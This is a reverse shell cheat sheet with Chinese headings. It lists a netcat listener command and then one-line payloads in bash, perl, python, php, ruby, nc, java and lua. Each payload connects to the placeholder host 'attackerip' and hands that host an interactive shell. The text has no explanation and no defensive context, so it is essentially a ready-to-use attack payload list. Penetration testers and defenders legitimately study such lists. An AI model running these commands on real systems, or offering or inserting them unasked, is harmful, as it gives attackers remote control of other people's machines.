# Reverse Shell Cheat Sheet

## 利用 nc 监听端口
```bash
nc -lvp 2333
```
## bash 版本：
```bash
bash -i >& /dev/tcp/attackerip/2333 0>&1

bash -i >& /dev/tcp/attackerip/2333 <&2

exec 5<>/dev/tcp/attackerip/2333;cat <&5|while read line;do $line >&5 2>&1;done

0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196

mknod backpipe p; nc attackerip 2333 0<backpipe | /bin/bash 1>backpipe 2>backpipe
```
## perl 版本:
```bash
perl -e 'use Socket;$i="attackerip";$p=2333;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```
## python 版本：
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attackerip",2333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
## php 版本：
```bash
php -r '$sock=fsockopen("attackerip",2333);exec("/bin/sh -i <&3 >&3 2>&3");'
```
## ruby 版本：
```bash
ruby -rsocket -e'f=TCPSocket.open("attackerip",2333).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```
## nc 版本：
```bash
nc -e /bin/sh attackerip 2333

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attackerip 2333 >/tmp/f

nc attackerip 8888|/bin/sh|nc attackerip 9999
```
## java 版本：
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/attackerip/2333;cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## lua 版本：
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('attackerip','2333');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```